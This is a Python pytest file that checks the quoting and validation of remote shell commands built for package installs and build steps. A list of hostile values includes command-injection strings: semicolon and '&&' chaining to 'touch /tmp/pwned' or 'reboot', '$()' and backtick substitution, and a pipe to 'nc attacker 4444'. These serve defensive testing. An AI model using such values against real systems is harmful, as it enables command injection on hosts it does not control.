"""apply_packages / run_build が組み立てるリモートコマンドの安全性検証（ENVB-0010）。

リモートへ渡る文字列を shlex.split で分解し、メタ文字を含む入力が 1 つの引数のまま残る
（別コマンドとして解釈されない）こと、不正な名前が実行前に拒否されることを確認する。
"""

import shlex

import pytest

from scripts.apply_packages import _install_command, _rpm_query_command
from scripts.core.shell import (
    quote_remote_path,
    validate_command_name,
    validate_env_name,
    validate_package_name,
)
from scripts.run_build import _env_prefix, _step_command

HOSTILE_VALUES = [
    "a; touch /tmp/pwned",
    "a && reboot",
    "a | nc attacker 4444",
    "$(touch /tmp/pwned)",
    "`touch /tmp/pwned`",
    "a\ntouch /tmp/pwned",
    "with space and 'quote'",
    'with "double"',
]


@pytest.mark.parametrize(
    "name",
    ["gcc", "libcurl-devel", "gcc-c++", "python3.9", "pkg-1.2.3-4.el8.x86_64", "@development", "perl:5"],
)
def test_validate_package_name_accepts_normal_names(name: str) -> None:
    assert validate_package_name(name) == name


@pytest.mark.parametrize(
    "name",
    [
        "",
        "-y",
        "--installroot=/tmp/x",
        "a b",
        "a;b",
        "a$(b)",
        "a`b`",
        "a\nb",
        "a|b",
        "a&b",
        "a>b",
        'a"b',
        "a'b",
        None,
        1,
    ],
)
def test_validate_package_name_rejects_unsafe_names(name: object) -> None:
    with pytest.raises(ValueError):
        validate_package_name(name)


@pytest.mark.parametrize("name", ["FOO", "_foo", "VERSION_MNG", "a1"])
def test_validate_env_name_accepts_identifiers(name: str) -> None:
    assert validate_env_name(name) == name


@pytest.mark.parametrize("name", ["", "1A", "A-B", "A B", "A=B", "A;B", "A$B", "A\nB", "export X", None])
def test_validate_env_name_rejects_non_identifiers(name: object) -> None:
    with pytest.raises(ValueError):
        validate_env_name(name)


@pytest.mark.parametrize("name", ["dnf", "yum", "microdnf", "zypper"])
def test_validate_command_name_accepts_simple_names(name: str) -> None:
    assert validate_command_name(name) == name


@pytest.mark.parametrize("name", ["", "dnf; reboot", "/usr/bin/dnf", "dnf -y", "-dnf", "dnf\nx", "$(dnf)"])
def test_validate_command_name_rejects_paths_options_and_metacharacters(name: str) -> None:
    with pytest.raises(ValueError):
        validate_command_name(name)


def test_rpm_query_command_separates_options_and_quotes_name() -> None:
    tokens = shlex.split(_rpm_query_command("libcurl-devel"))

    assert tokens[:4] == ["rpm", "-q", "--", "libcurl-devel"]


@pytest.mark.parametrize("hostile", HOSTILE_VALUES + ["-y", "--installroot=/tmp/x"])
def test_rpm_query_command_rejects_hostile_package_names(hostile: str) -> None:
    with pytest.raises(ValueError):
        _rpm_query_command(hostile)


def test_install_command_lists_each_package_as_one_argument() -> None:
    tokens = shlex.split(_install_command("dnf", ["gcc", "libcurl-devel", "pkg-1.2-3.el8.x86_64"]))

    assert tokens == ["dnf", "install", "-y", "gcc", "libcurl-devel", "pkg-1.2-3.el8.x86_64"]


@pytest.mark.parametrize("hostile", HOSTILE_VALUES + ["-y", "--installroot=/tmp/x"])
def test_install_command_rejects_hostile_package_names(hostile: str) -> None:
    with pytest.raises(ValueError):
        _install_command("dnf", ["gcc", hostile])


@pytest.mark.parametrize("hostile", ["dnf; reboot", "dnf && reboot", "$(reboot)", "/tmp/evil", "dnf -y"])
def test_install_command_rejects_hostile_package_manager(hostile: str) -> None:
    with pytest.raises(ValueError):
        _install_command(hostile, ["gcc"])


def test_quote_remote_path_quotes_plain_and_hostile_paths() -> None:
    assert shlex.split(quote_remote_path("/home/seigyo/neo_app")) == ["/home/seigyo/neo_app"]
    for hostile in HOSTILE_VALUES:
        path = "/opt/" + hostile
        assert shlex.split(quote_remote_path(path)) == [path]


def test_quote_remote_path_expands_leading_tilde_to_home() -> None:
    # shlex.quote だけでは "~" が展開されないため、$HOME に置き換える
    assert quote_remote_path("~") == '"$HOME"'
    assert quote_remote_path("~/") == '"$HOME"'
    assert quote_remote_path("~/neo_app") == '"$HOME"/neo_app'
    assert quote_remote_path("~/with space") == "\"$HOME\"/'with space'"


def test_quote_remote_path_keeps_tilde_literal_when_not_leading_home() -> None:
    assert shlex.split(quote_remote_path("~other/x")) == ["~other/x"]
    assert shlex.split(quote_remote_path("/opt/~/x")) == ["/opt/~/x"]


def test_quote_remote_path_hostile_suffix_after_home_stays_one_argument() -> None:
    quoted = quote_remote_path("~/a; touch /tmp/pwned")

    # $HOME は展開用のダブルクォート、残りはシングルクォートのリテラル
    assert quoted.startswith('"$HOME"/')
    assert shlex.split(quoted.replace('"$HOME"', "HOME_PLACEHOLDER")) == ["HOME_PLACEHOLDER/a; touch /tmp/pwned"]


@pytest.mark.parametrize("path", ["", "/opt/a\x00b"])
def test_quote_remote_path_rejects_empty_and_nul(path: str) -> None:
    with pytest.raises(ValueError):
        quote_remote_path(path)


def test_env_prefix_exports_values_as_literals() -> None:
    prefix = _env_prefix({"VERSION_MNG": "/opt/mel/modern/lib64/version_mng"})

    assert prefix == "export VERSION_MNG=/opt/mel/modern/lib64/version_mng; "


@pytest.mark.parametrize("hostile", HOSTILE_VALUES)
def test_env_prefix_keeps_hostile_value_as_single_literal(hostile: str) -> None:
    prefix = _env_prefix({"FOO": hostile})
    # 末尾の `; ` は意図した区切り。これを取り除いた `export FOO=<値>` が、ちょうど 2 つの引数になる。
    assert prefix.endswith("; ")
    tokens = shlex.split(prefix[: -len("; ")])

    # 値の中の `;` や `$()` や改行が、別のコマンドや展開にならず、値の一部として残る
    assert tokens == ["export", f"FOO={hostile}"]


def test_env_prefix_chains_multiple_variables_as_separate_export_commands() -> None:
    prefix = _env_prefix({"A": "1; touch /tmp/pwned", "B": "2"})

    # posix=True の shlex は `;` を単語の一部にしてしまうため、punctuation_chars で演算子として分解する。
    lexer = shlex.shlex(prefix, posix=True, punctuation_chars=";")
    lexer.whitespace_split = True
    tokens = list(lexer)

    # 区切りの `;` は 2 つ（各 export の後ろ）だけで、値の中の `;` は演算子にならない
    assert tokens == ["export", "A=1; touch /tmp/pwned", ";", "export", "B=2", ";"]


def test_env_prefix_does_not_expand_shell_variables_in_values() -> None:
    prefix = _env_prefix({"P": "$HOME/x"})

    assert prefix == "export P='$HOME/x'; "


@pytest.mark.parametrize("bad_name", ["A-B", "A B", "A=B", "A;B", "1A", "", "A$(x)"])
def test_env_prefix_rejects_invalid_variable_names(bad_name: str) -> None:
    with pytest.raises(ValueError):
        _env_prefix({bad_name: "x"})


def test_step_command_quotes_workdir_and_keeps_build_command_as_shell() -> None:
    command = _step_command("/home/seigyo/neo_app/src", "export A=1; ", "make clean && make -j4")

    assert command == "cd -- /home/seigyo/neo_app/src && export A=1; make clean && make -j4"


def test_step_command_does_not_quote_the_build_command() -> None:
    # ビルド手順は desired_state が定義するシェルコマンドそのもの（演算子を含んでよい）
    command = _step_command("/opt/x", "", "./configure && make; make install")

    assert command.endswith("./configure && make; make install")


@pytest.mark.parametrize("hostile", HOSTILE_VALUES)
def test_step_command_keeps_hostile_workdir_as_single_argument(hostile: str) -> None:
    workdir = "/opt/" + hostile
    command = _step_command(workdir, "", "true")
    head = command.split(" && true")[0]
    tokens = shlex.split(head)

    assert tokens[:2] == ["cd", "--"]
    assert tokens[2] == workdir
    assert len(tokens) == 3


def test_step_command_expands_tilde_workdir_through_home() -> None:
    command = _step_command("~/neo_app/src", "", "make")

    assert command == 'cd -- "$HOME"/neo_app/src && make'


def test_step_command_rejects_empty_workdir() -> None:
    with pytest.raises(ValueError):
        _step_command("", "", "make")
